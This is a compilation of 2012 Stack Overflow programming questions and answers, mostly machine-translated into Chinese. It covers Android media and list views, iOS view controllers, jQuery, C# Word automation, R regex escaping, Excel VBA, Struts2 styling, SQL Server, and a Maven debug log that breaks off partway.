> 标签：android, android-mediaplayer, android-button

我正在尝试将背景音乐添加到我的应用程序中。我想要的只是在按下时应该播放声音，`btnoptn` `Button`并且它的文本会转换为“音乐关闭”。音乐应继续播放，`Activity`直到返回设置页面并`Button`再次按下相同的按钮。音乐随即停止，`Button`文本变为“music on”。

到目前为止，这是我的代码：

```
package hello.english;

import hello.english.R;
import android.app.Activity;
import android.content.Intent;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.media.MediaPlayer;
import android.os.Bundle;

public class welcome extends Activity implements OnClickListener{
    private Button btnoptn;
    private Button btnmenu;
    public static MediaPlayer mp2;

    private void btnoptn(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);     
        final Button testButton = (Button) findViewById(R.id.btnoptn);
        testButton.setTag(1);

        testButton.setText("Musik Of");
        mp2=MediaPlayer.create(this, R.raw.guitar_music);
        mp2.start();
        mp2.setLooping(true);
        testButton.setOnClickListener( new View.OnClickListener() {
            public void onClick (View v) {
                final int status =(Integer) v.getTag();

                if(status == 1) {
                    mp2.start();
                    mp2.setLooping(true);
                    testButton.setText("Musik Of");
                    v.setTag(0); //pause
                } else {
                    mp2.pause();
                    testButton.setText("Musik On");
                    v.setTag(1);
                } //pause
            }
        });
    }

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.welcome);

        btnoptn=(Button)findViewById(R.id.btnoptn);
        btnmenu=(Button)findViewById(R.id.btnmenu);

        btnoptn.setOnClickListener( new View.OnClickListener() {
        public void onClick(View view) {
            btnoptn(null);
        }

        });

        btnmenu.setOnClickListener( new View.OnClickListener() {
            public void onClick(View view2) {
            btnmenu();
        }
        });
    }

    protected void btnmenu() {
        try {
            Intent btnmenu= new Intent (this, menuenglish.class);
            startActivity(btnmenu);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onStart() {
        super.onStart();
        btnoptn.setTag(0);
    }

    public void onClick(View view2) {
        // TODO Auto-generated method stub
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T12:57:06.257

This is a really simple example. I don't know how it works if you switch between Activities, i never really worked with the MediaPlayer class.

```
public class MainActivity extends Activity 
{
    private MediaPlayer mediaPlayer;
    private Button musicButton;
    private OnClickListener listener = new OnClickListener()
    {
        // a boolean value in the names Onclicklistener class. 
        // this will help us to know, if the music is playing or not.
        boolean isPlaying = false;

        @Override
        public void onClick(View arg0)
        {
            if(isPlaying)
            {
                mediaPlayer.pause(); //stop the music
                musicButton.setText("Start"); //change the buttons text
            }
            else
            {
                mediaPlayer.start(); //start the music
                musicButton.setText("Stop"); //change the text
            }
            //changing the boolean value
            isPlaying = !isPlaying;
        }
    };

    @Override
    public void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        //Creating the mediaplayer with a desired soundtrack.
        mediaPlayer = MediaPlayer.create(this, R.raw.my_music);

        //Getting the Button reference from the xml
        musicButton = (Button) findViewById(R.id.music_button);

        //Setting the listener
        musicButton.setOnClickListener(listener);
    }
} 
```

# iphone - 关闭图像选择器后关闭视图控制器

> ID：11806750
> 
> 赞同：-1
> 
> 时间：2012-08-04T07:22:18.103
> 
> 标签：iphone, uiviewcontroller

我有一个视图控制器让我们说 A。我正在呈现另一个视图控制器让我们在 A 上说 B。在 B 的视图中将出现我正在创建 MPMoviePlayerController 的对象并将其呈现在 B 上。

现在，当电影播放器​​停止播放电影时，我正在做以下事情：

```
[self dismissMoviePlayerViewControllerAnimated];
[self dismissModalViewControllerAnimated:YES]; 
```

但这只是解雇电影播放器​​。我想继续我的A的观点。我怎样才能背靠背解雇两个视图控制器。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T07:25:55.283

这是因为您的电影播放器​​正在被关闭，而您正试图关闭您的视图。使用以下：

```
[self performSelector:@selector(dismissSelfView) withObject:nil afterDelay:0.6];

- (void)dismissSelfView {
      [self dismissModalViewControllerAnimated:YES];
} 
```

另请注意，`[self dismissModalViewControllerAnimated:YES];`在 ios5 中已弃用，因此更好地使用：`dismissViewControllerAnimated:completion:`. 请检查[UIViewController 类参考](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIViewController_Class/Reference/Reference.html)。

希望这可以帮助。

# jquery - 复选框禁用不使用 jQuery

> ID：11806751
> 
> 赞同：1
> 
> 时间：2012-08-04T07:22:22.340
> 
> 标签：jquery, checkbox

[我正在尝试使用jQuery](http://jquery.com/)禁用复选框列表中的复选框。但这似乎不起作用。这是代码。复选框列表共有 12 个复选框。

```
<script src="../AutoComplete Jquery/jquery-1.7.2.min.js" type="text/javascript">  
</script>
<script type="text/javascript">
$(document).ready(function() 
{
var disable = 5;
var i=0;
$(":checkbox").each(function()
                {
                    if(i<disable)
                    {
                        $(this).attr("disabled", "disabled");
                        i=i+1;
                    }
                });
});
</script> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T07:24:05.990

你可以试试这个：

```
$(':checkbox:lt(5)').attr('disabled', 'disabled'); 
```

或者

```
$(':checkbox:lt(5)').prop('disabled', true); 
```

根据您的方法：

```
$(":checkbox").each(function(i, check) {
    if (i < disable) {
        $(this).attr("disabled", "disabled");
    }
}); 
```

在**[.each()](http://api.jquery.com/jQuery.each/)**回调函数中，第一个参数是`index`of 复选框。所以你不需要保留`i`索引。

要再次启用`checkbox`：

`.removeAttr('disabled');`或`.prop('disabled', false)`。

# android - 自定义列表视图，setText 时出错

> ID：11806757
> 
> 赞同：0
> 
> 时间：2012-08-04T07:23:28.493
> 
> 标签：android, android-listview, textview, nullpointerexception

我创建了一个自定义列表视图。它有一个图像、文本和一个复选框，当我尝试为上面设置一个值时，我得到一个 NULL 指针异常。如果我没有设置一个值，我怎么会得到默认列表……为什么会这样？

```
class PInfo {
    String appname = "";
    String pname = "";
    String versionName = "";
    int versionCode = 0;
    int icon;
 }

 public class InstalledApps extends Activity{

    private static LayoutInflater inflater=null;
private ListView listview;
private Activity activity;

List<PInfo> installedApps = new ArrayList<PInfo>();

@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.applist);

    activity = this;
    listview = (ListView)findViewById(R.id.listView1);

    PackageManager pm = getPackageManager();
    List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

    for(ApplicationInfo app : packages) {

        PInfo newInfo = new PInfo();
            newInfo.appname = (String) app.loadLabel(pm);
            newInfo.pname = app.packageName;

        if((app.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 1){             
            installedApps.add(newInfo);

        } else if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
            installedApps.add(newInfo);

        } else {

            installedApps.add(newInfo); 
        }
    }

    InstalledAppsAdapter iap = new InstalledAppsAdapter(this, installedApps);
listview.setAdapter(iap);

}
}

   class InstalledAppsAdapter extends BaseAdapter{

private Activity activity;
private static LayoutInflater inflater=null;
List<PInfo> installedApps = new ArrayList<PInfo>();
ListView listview; 

public InstalledAppsAdapter(Activity a, List<PInfo> b) {

    // TODO Auto-generated constructor stub
    installedApps = b;
    activity = a;
    inflater = (LayoutInflater)activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    listview = (ListView)activity.findViewById(R.id.listView1);
}

@Override
public int getCount() {
    // TODO Auto-generated method stub
    return installedApps.size();
}

@Override
public Object getItem(int arg0) {
    // TODO Auto-generated method stub
    return arg0;
}

@Override
public long getItemId(int arg0) {
    // TODO Auto-generated method stub
    return arg0;
}

@Override
public View getView(int arg0, View arg1, ViewGroup arg2) {
    // TODO Auto-generated method stub

    View customView = arg1;
    ViewHolder holder;

    if(arg1 == null){
        customView = inflater.inflate(R.layout.listrow, null);

    holder = new ViewHolder();
    holder.iv = (ImageView)customView.findViewById(R.id.imageView1);
    holder.tv = (TextView) customView.findViewById(R.id.textView2);
    holder.cb = (CheckBox)customView.findViewById(R.id.checkBox1);

    }else{
        holder = (ViewHolder)customView.getTag();
    }

    PInfo pinfo = installedApps.get(arg0);

    holder.tv.setText(""+pinfo.appname);

    return customView;
}

static class ViewHolder{

    ImageView iv;
    CheckBox cb;
    TextView tv;

} 
```

}

编辑：添加了完整的源代码

看起来好像 findViewById(R.id.textView1) 正在返回 null..为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:34:48.450

尝试用空检查包围该行。这应该可以解决问题，

```
if(holder.tv!=null)
 {
 holder.tv.setText(""+pinfo.appname);
 } 
```

这不会对逻辑造成任何损害。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:41:16.003

我认为您在任何其他 ui 中使用*** *"textView1"*** *named id。更改 TextView 的 id 名称并使用它。

检查此代码

```
public View getView(int arg0, View arg1, ViewGroup arg2) {
    // TODO Auto-generated method stub

    View  customView = inflater.inflate(R.layout.listrow, parent,false);

    ImageView iv = (ImageView)customView.findViewById(R.id.imageView1);
    TextView tv= (TextView) customView.findViewById(R.id.textView1);
    CheckBox cb= (CheckBox)customView.findViewById(R.id.checkBox1);

    PInfo pinfo = installedApps.get(arg0);
   tv.setText(""+pinfo.appname);//If u comment this line it works

    return customView;
} 
```

使用此代码而不是那个。愿它解决你的问题。

# c# - 使用 C# 在 docx 中选择页面

> ID：11806763
> 
> 赞同：2
> 
> 时间：2012-08-04T07:24:38.423
> 
> 标签：c#, ms-word

我目前正在一个变量中获取整个 word 文档，如下所示：

```
docs.ActiveWindow.Selection.WholeStory();
docs.ActiveWindow.Selection.Copy();
IDataObject data = Clipboard.GetDataObject(); 
```

Wholestory() 函数选择整个 word 文档。

如果我可以逐页选择，请建议我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-06T16:59:50.517

您需要设置要选择的范围。

例子：

```
object what = WdGoToItem.wdGoToPage;
object which = WdGoToDirection.wdGoToAbsolute;
object count = 0;

const string fileName = "C:\\1.docx";
object fileNameAsObject = fileName;

Application wordApplication = new Application();
object readOnly = false;
object missing = System.Reflection.Missing.Value;
wordApplication.Documents.Open(ref fileNameAsObject, ref missing, ref readOnly, ref missing,
                                 ref missing, ref missing, ref missing, ref missing,
                                 ref missing, ref missing, ref missing, ref missing,
                                 ref missing, ref missing, ref missing, ref missing);

Range startRange = wordApplication.Selection.GoTo(ref what, ref which, ref count, ref missing);
object count2 = (int)count + 1;
Range endRange = wordApplication.Selection.GoTo(ref what, ref which, ref count2, ref missing);

 //if you want to select last page
 if (endRange.Start == startRange.Start)
 {
   which = WdGoToDirection.wdGoToLast;
   what = WdGoToItem.wdGoToLine;
   endRange = wordApplication.Selection.GoTo(ref what, ref which, ref count2, ref missing);
 }

 endRange.SetRange(startRange.Start, endRange.End);
 endRange.Select(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:32:54.310

你应该能够做这样的事情：

[我们如何在 c sharp 中打开具有特定页码的 word 文件？](https://stackoverflow.com/questions/3870797/how-can-we-open-a-word-file-with-specific-page-number-in-c-sharp)

```
object what = Microsoft.Office.Interop.Word.WdGoToItem.wdGoToPage;
object which = Microsoft.Office.Interop.Word.WdGoToDirection.wdGoToFirst;
object count = 3;

wordApplication.Selection.GoTo(ref what, ref which, ref count, ref missing); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-04-08T12:09:53.300

这是在 Google 上弹出的第一个项目。为了节省将来我的时间，如果你想去书签，你可以做这样的事情。

```
 private void WordGoto(string _name)
    {
        object what = WdGoToItem.wdGoToBookmark;
        object which = WdGoToDirection.wdGoToAbsolute;
        object name = _name;
        //object count = 0;
        object missing = System.Reflection.Missing.Value;
        Wordapp.Selection.GoTo(ref what, ref missing, ref missing, ref name);
    } 
```

# syntax-highlighting - 以编程方式向 AvalonEdit 添加语法高亮规则

> ID：11806764
> 
> 赞同：7
> 
> 时间：2012-08-04T07:24:43.300
> 
> 标签：syntax-highlighting, avalonedit

我在运行我自己的定制语言的应用程序中使用 AvalonEdit。我想在 Avalon Edit 中加入适当的语法高亮。通常这是通过在 xml 文件中手动定义突出显示规则来完成的。

但是，我不希望每当我扩展语言时突出显示规则总是与语言语法不同步。所以我希望使用我的 coco/R 解析器中已经包含的语法信息来自动生成这些规则。那么有没有办法以编程方式向 Avalon Edit 添加语法高亮规则？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-08T09:15:31.107

下面的代码至少对我有用。

```
Assembly assembly = Assembly.GetExecutingAssembly();
using (Stream s = assembly.GetManifestResourceStream("Your.xshd"))
{
    using (XmlTextReader reader = new XmlTextReader(s))
    {
        //Load default Syntax Highlighting
        InternalEditor.SyntaxHighlighting = HighlightingLoader.Load(reader, HighlightingManager.Instance);

        // Dynamic syntax highlighting for your own purpose
        var rules = InternalEditor.SyntaxHighlighting.MainRuleSet.Rules;

        _HighlightingRule = new HighlightingRule();
        _HighlightingRule.Color = new HighlightingColor()
        {
                Foreground = new CustomizedBrush(SomeColor)
        };

        String[] wordList = PseudoGetKeywords(); // Your own logic
        String regex = String.Format(@"\b({0})\w*\b", String.Join("|", wordList));
        _HighlightingRule.Regex = new Regex(regex);

        rules.Add(_HighlightingRule);
    }
}

internal sealed class CustomizedBrush : HighlightingBrush
{
    private readonly SolidColorBrush brush; 
    public CustomizedBrush(Color color)
    {
        brush = CreateFrozenBrush(color);
    }

    public CustomizedBrush(System.Drawing.Color c)
    {
        var c2 = System.Windows.Media.Color.FromArgb(c.A, c.R, c.G, c.B);        
        brush = CreateFrozenBrush(c2);
    }

    public override Brush GetBrush(ITextRunConstructionContext context)
    {
        return brush;
    }

    public override string ToString()
    {
        return brush.ToString();
    }

    private static SolidColorBrush CreateFrozenBrush(Color color)
    {
        SolidColorBrush brush = new SolidColorBrush(color);
        brush.Freeze();
        return brush;
    }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-08T22:08:15.007

`ICSharpCode.AvalonEdit.Highlighting.Xshd`您可以使用（`XshdSyntaxDefinition`等）中的对象模型在内存中生成 .xshd 文件。

要将其转换为`IHighlightingDefinition`，请使用该`HighlightingLoader.Load()`方法。您还可以通过应用`SaveXshdVisitor`.

或者，您可以`IHighlightingDefinition`自己实现并直接创建`HighlightingRuleSet`实例。

# regex - 正则表达式“\\|” 在 strsplit 中

> ID：11806768
> 
> 赞同：4
> 
> 时间：2012-08-04T07:25:26.593
> 
> 标签：regex, string, r

```
>str= "AAC|Australia Acquisition Corp. - Ordinary Shares|S|N|D|100"
> strsplit(str,"\\|")
[[1]]
[1] "AAC"                                          
[2] "Australia Acquisition Corp. - Ordinary Shares"
[3] "S"                                            
[4] "N"                                            
[5] "D"                                            
[6] "100" 
```

我想知道`\\|`等于`|`？
也许`\\|`等于`\|`，
为什么可以 `strsplit(str,"\\|")`工作？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-04T07:28:34.660

自从

```
| 
```

在 reg-exps 中具有特殊含义，需要对其进行转义，因此要匹配`|` **实际的正则表达式**是

```
\| 
```

由于`\`在声明字符串文字时反过来是一个特殊字符（您可能会从中识别出它`\n`等），因此`\`需要自行转义。即，为了创建包含`\|`您需要的字符串文字

```
\\| 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-04T07:30:31.353

因为它是一个带引号的字符串。`"`在带引号的字符串中，您可以使用 .转义字符来包含字符`\`。A`\`本身也需要转义为单个文字反斜杠。所以你引用的字符串意味着：`\|`。

现在在正则表达式中，a`|`是一个特殊字符，除非它被转义，否则它不会按字面意思匹配。R 中的正则表达式也用反斜杠转义，因此字符串字面量表示与 完全匹配的表达式`"\\|"`的字符串。为什么有效是因为这意味着完全匹配您要拆分的字符串中的分隔符。`\|``|``"\\|"``|`

在 R 中更具体地[引用正则表达式](http://stat.ethz.ch/R-manual/R-patched/library/base/html/regex.html)可能会很方便，但它和许多人一样，引用[perl 正则表达式](http://perldoc.perl.org/perlre.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T07:29:06.857

从我对正则表达式的了解很少，我认为“\|” 本身可以工作（反斜杠转义管道。来源：[正则表达式参考](http://www.regular-expressions.info/reference.html/)

# android - 如何判断两个地理点的方向

> ID：11806776
> 
> 赞同：6
> 
> 时间：2012-08-04T07:27:34.567
> 
> 标签：android, point, direction, geopoints

我有 3 个地理点

(起始位置)11.986242477259117, 79.84657287597656`

(中间位置)11.984521304799278, 79.84583258628845

(完结)11.985014568760436, 79.844491481781

我从[如何使用 kml 文件在地图上绘制路径中获得了知识？](https://stackoverflow.com/questions/3109158/how-to-draw-a-path-on-a-map-using-kml-file/3109723#3109723)

我已经像这样在地理点之间画了线。

![在此处输入图像描述](../Images/bbd4eafba58d6f80af87a9a4a04f717a.png)

我已经使用[如何使用它们的经度和纬度值计算两个位置之间的距离来计算距离](https://stackoverflow.com/questions/6981916/how-to-calculate-distance-between-two-locations-using-their-longitude-and-latitu?rq=1)

我的问题是，当用户站在“A”（起始位置）附近时，我想告诉方向，你已经像这样移动到“北”、“东”、“西”、“南”。

如果用户错误地移动了其他方向，需要像“你移动错误的方向”一样告诉并说出正确的方向。

如何获得两个地理点之间的方向。？

我已经[通过两个经度/纬度点从获取方向（指南针）获取度数](https://stackoverflow.com/questions/8502795/get-direction-compass-with-two-longitude-latitude-points?rq=1)

它返回一定程度，但我无法告诉正确的方向。

如何获得两个地理点之间的方向。？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T08:17:08.687

检查此方法是否可以帮助您：

```
location.getBearing() 
```

[**返回真北以东度数的行进方向。如果 hasBearing() 为 false，则返回 0.0。**](http://developer.android.com/reference/android/location/Location.html#getBearing%28%29)

使用此方法或传感器获取设备的方向。

之后，使用以下方法获取两点的方向：

```
location.bearingTo(dest) 
```

[**沿此位置和给定位置之间的最短路径行进时，返回真北以东度数的近似初始方位。最短路径是使用 WGS84 椭球定义的。（几乎）对映的位置可能会产生毫无意义的结果。**](http://developer.android.com/reference/android/location/Location.html#bearingTo%28android.location.Location%29)

# regex - 给定特定的正则表达式模式，重新排列和操作单元格的内容

> ID：11806777
> 
> 赞同：0
> 
> 时间：2012-08-04T07:27:43.810
> 
> 标签：regex, vba, excel

我对 Excel 中的宏编程完全陌生，找不到任何参考资料来解决我的问题。

我在 Excel 中有一个包含几个单词的列。如果该词是动词，则在该词之后有一个星号（没有空格）。

例如，部分列如下所示：

```
accuse*
accustomed be*
acid
acidic
acquire*
acre 
```

所以我需要：

1.  查找单元格以星号结尾的所有实例，删除该星号，并将“to”一词放在单元格条目的前面。
2.  如果单词有“be*”，那么我需要删除星号，单词“be”，并将“to be”放在前面。

完成的列应如下所示：

```
to accuse
to be accustomed
acid
acidic
to acquire
acre 
```

这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T08:50:23.153

试试这个（选择列表然后运行这个）

```
Sub Demo()
    Dim cl As Range

    For Each cl In Selection.Cells
        If Trim(cl) Like "*[*]" Then
            Cl = trim(cl)
            cl = "to " & Left(cl, Len(cl) - 1)
        End If
    Next
End Sub 
```

实际数据包括训练换行符，有时 * 前有一个空格，有时 * 后有术语

这个版本处理这些问题

```
Sub Demo()
    Dim cl As Range
    Dim r As Range
    Dim str As String, i As Long
    Set r = Selection
    For Each cl In r.Cells
        str = Trim(cl)
        str = Replace(str, " *", "*")
        If Asc(Right$(str, 1)) <= 31 Then
            str = Trim(Left$(str, Len(str) - 1))
        End If
        If str Like "* be[*]*" Then
            i = InStr(str, "*")
            cl = "to be " & Left$(str, i - 4 & Mid$(str, i + 1))
        ElseIf str Like "*[*]*" Then
            i = InStr(str, "*")
            cl = "to " & Left$(str, i - 1) & Mid$(str, i + 1)
        End If
    Next
End Sub 
```

# struts2 - 当我尝试从另一个页面注销时，没有在主页上获得样式？

> ID：11806779
> 
> 赞同：1
> 
> 时间：2012-08-04T07:28:16.423
> 
> 标签：struts2

我开发了一个简单的 struts2 Web 应用程序。其中有两个页面**index.jsp**和**page1.jsp**位于名为**Page的文件夹中**

我使用了以下 jar 文件

```
 antlr.jar
 commons-beanutils.jar
 commons-digester.jar
 commons-fileupload.jar
 commons-logging.jar
 commons-logging-1.0.4.jar
 commons-validator.jar
 freemarker-2.3.8.jar
 jakarta-oro.jar
 jsf-api.jar
 jsf-impl.jar
 jstl-1.2.jar
 ognl-2.6.11.jar
 struts.jar
 struts2-core-2.0.11.2.jar
 xwork-2.0.5.jar 
```

**struts.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
   "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
   "http://struts.apache.org/dtds/struts-2.0.dtd">
<struts>
<constant name="struts.devMode" value="true" />
<constant name="struts.custom.i18n.resources" value="ApplicationResources" />
   <package name="helloworld" extends="struts-default">

      <action name="log1" class="com.loginAction">
            <result name="success">/index.jsp</result>
      </action>
   </package>
</struts> 
```

**web.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd" id="WebApp_ID" version="3.0">
  <display-name>Struts2_Sample</display-name>

   <filter>
      <filter-name>struts2</filter-name>
      <filter-class>
         org.apache.struts2.dispatcher.FilterDispatcher
      </filter-class>
   </filter>

   <filter-mapping>
      <filter-name>struts2</filter-name>
      <url-pattern>/*</url-pattern>
   </filter-mapping>

  <welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
  </welcome-file-list>
</web-app> 
```

**索引.jsp**

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%@ taglib prefix="s" uri="/struts-tags" %>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<link rel="stylesheet" href="css/style.css" type="text/css" media="screen">
<body>
<s:a href="Page/page1.jsp">LOGIN</s:a>
</body>
</html> 
```

**页面/page1.jsp**

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%@ taglib prefix="s" uri="/struts-tags" %>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<link rel="stylesheet" href="css/style.css" type="text/css" media="screen">
<body>
<s:form action="log1" method="post">
  <s:textfield name="name" label="USERNAME"></s:textfield>
   <s:password name="pass" label="PASSWORD"></s:password>
  <s:submit method="execute" label="LOGIN"></s:submit>
</s:form>
</body>
</html> 
```

**样式.css**

```
body 
{
background:olive;
} 
```

**loginAction.java**

```
package com;
import com.opensymphony.xwork2.ActionSupport;
public class loginAction extends ActionSupport {

    public String execute() {
         return SUCCESS;        
    }
} 
```

下图显示了我的应用程序的目录结构。 [http://www.sendspace.com/file/zm46c1](http://www.sendspace.com/file/zm46c1)

当我运行应用程序时，它将直接指向**index.jsp**页面，其中出现一个**LOGIN**超链接。此页面具有我在**style.css**中定义的橄榄色背景颜色。现在，当我单击它时，它将定向到**page1.jsp**，显示两个文本字段和一个提交按钮。

**问题：**

当我单击提交按钮时，它将直接指向前一个**index.jsp**，但没有任何背景颜色。即使我点击它，它也会显示一个错误页面。

以下图片附件显示了我的应用程序的所有网页。 [http://www.sendspace.com/file/djnqvo](http://www.sendspace.com/file/djnqvo)

当我单击登录超链接时，我会得到错误页面。

**谁能告诉我为什么我会变成这样。**

**有没有解决这个问题的方法。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T08:16:03.343

把`<s:url value="/css/style.css"/>`而不是`css/style.css`. 它首先与 . 一起工作`index.jsp`，因为 jsp 是在同一目录中搜索 css 文件夹，但是当您访问其他两个页面时，正在搜索 Page 文件夹中的 css 文件夹。

# android - Android：如何从 BaseAdapter 类中过滤数据？

> ID：11806780
> 
> 赞同：1
> 
> 时间：2012-08-04T07:28:16.877
> 
> 标签：android

我有一个 BaseAdpter 类......主 Activity 使用 BaseAdapter 类来设置 ListView，如下所示，

# **代码**

```
 ListView contactList;
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    contactList = (ListView)findViewById(R.id.facebookList);
    contactList.setAdapter(new **BaseAdapterClass**(this)); 
```

现在我在这里使用editView的addTextChangedListener，如下所示，

```
 searchEt.addTextChangedListener(new TextWatcher() {

   public void onTextChanged(CharSequence s, int start, int before, int count) {
             //do something to filter Base Adapter Class
    } 
```

但是我可以理解如何在这里使用**onTextChanged()**方法来过滤基本适配器的记录，其中排序方式是在搜索 EditBox 中输入文本。请帮助我实现这一目标。如果任何与这种情况相关的示例教程也请参考我......

# sql - 在供应商 sql server 数据库上使用 VIEWS 的替代方法

> ID：11806784
> 
> 赞同：1
> 
> 时间：2012-08-04T07:29:04.517
> 
> 标签：sql, sql-server, database, views, vendor

我有一个供应商 SQL Server 2008 db，我正在尝试添加其他表等，以针对我的订单处理 .Net 3.5 站点进行自定义。不应更改供应商数据库。但是我需要记录未包含在供应商数据库中的当前订单状态。

目前，我正在使用带有 CASE 的 VIEW 来根据 Orders 表中的数据获取状态。为了提高性能，我想创建一个带有 OrderID 和 Current_Status 的新状态表。

为了使状态表保持最新，是否有替代频繁运行脚本的替代方法，该脚本将查看所有订单并相应地更新状态表？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T12:36:06.157

创建一个 SSIS 作业以检查订单并更新状态表。并安排它每小时/每天运行一次（根据您的要求）。创建 SSIS 作业不会影响您的任何供应商进程或对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T17:48:34.617

如果查询施加的负载不高并且您可以容忍数据同步之前的一些延迟，则创建作业或其他轮询类型的解决方案可能很好。

如果您至少可以容忍一些延迟，但检查表的查询很广泛，或者如果您有多个表要执行此操作，您也可以使用[更改跟踪](http://msdn.microsoft.com/en-us/library/cc280462%28v=sql.105%29.aspx)，因为您有 SQL Server 2008。

[这是](http://msdn.microsoft.com/en-us/library/cc305322.aspx)有关如何使用它的链接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T03:30:19.430

如果您担心性能，那么索引视图怎么样？

# eclipse - 未能执行目标 org.apache.maven.plugins:maven-clean-plugin:2.4.1

> ID：11806786
> 
> 赞同：10
> 
> 时间：2012-08-04T07:29:40.433
> 
> 标签：eclipse, maven

我在做一个maven项目，我的IDE是Eclipse。我不能掌握的是在Eclipse中使用“clean -X”时，会报如下错误：</p>

```
Apache Maven 3.0.4 (r1232337; 2012-01-17 16:44:56+0800)
Maven home: /usr/share/java/apache-maven-3.0.4
Java version: 1.7.0_05, vendor: Oracle Corporation
Java home: /Library/Java/JavaVirtualMachines/1.7.0.jdk/Contents/Home/jre
Default locale: zh_CN, platform encoding: EUC_CN
OS name: "mac os x", version: "10.7.4", arch: "x86_64", family: "mac"
[INFO] Error stacktraces are turned on.
[DEBUG] Reading global settings from /usr/share/java/apache-maven-3.0.4/conf/settings.xml
[DEBUG] Reading user settings from /Users/lingxiubo/Documents/maven/settings.xml
[DEBUG] Using local repository at /Users/lingxiubo/Documents/maven/repo
[DEBUG] Using manager EnhancedLocalRepositoryManager with priority 10 for /Users/lingxiubo/Documents/maven/repo
[INFO] Scanning for projects...
[DEBUG] Extension realms for project org.soft:soft-enrol:war:0.0.1-SNAPSHOT: (none)
[DEBUG] Looking up lifecyle mappings for packaging war from ClassRealm[plexus.core, parent: null]
[DEBUG] === REACTOR BUILD PLAN ================================================
[DEBUG] Project: org.soft:soft-enrol:war:0.0.1-SNAPSHOT
[DEBUG] Tasks:   [clean]
[DEBUG] Style:   Regular
[DEBUG] =======================================================================
[INFO]                                                                         
[INFO] ------------------------------------------------------------------------
[INFO] Building soft-enrol Maven Webapp 0.0.1-SNAPSHOT
[INFO] ------------------------------------------------------------------------
[DEBUG] Lifecycle default -> [validate, initialize, generate-sources, process-sources, generate-resources, process-resources, compile, process-classes, generate-test-sources, process-test-sources, generate-test-resources, process-test-resources, test-compile, process-test-classes, test, prepare-package, package, pre-integration-test, integration-test, post-integration-test, verify, install, deploy]
[DEBUG] Lifecycle clean -> [pre-clean, clean, post-clean]
[DEBUG] Lifecycle site -> [pre-site, site, post-site, site-deploy]
[DEBUG] Lifecycle default -> [validate, initialize, generate-sources, process-sources, generate-resources, process-resources, compile, process-classes, generate-test-sources, process-test-sources, generate-test-resources, process-test-resources, test-compile, process-test-classes, test, prepare-package, package, pre-integration-test, integration-test, post-integration-test, verify, install, deploy]
[DEBUG] Lifecycle clean -> [pre-clean, clean, post-clean]
[DEBUG] Lifecycle site -> [pre-site, site, post-site, site-deploy]
[DEBUG] === PROJECT BUILD PLAN ================================================
[DEBUG] Project:       org.soft:soft-enrol:0.0.1-SNAPSHOT
[DEBUG] Dependencies (collect): []
[DEBUG] Dependencies (resolve): []
[DEBUG] Repositories (dependencies): [spring-maven-release (http://maven.springframework.org/release, releases+snapshots), spring-maven-milestone (http://maven.springframework.org/milestone, releases+snapshots), JBoss Repo (https://repository.jboss.org/nexus/content/repositories/releases, releases+snapshots), people.apache.snapshots (http://repository.apache.org/content/groups/snapshots-group/, snapshots), central (http://repo.maven.apache.org/maven2, releases)]
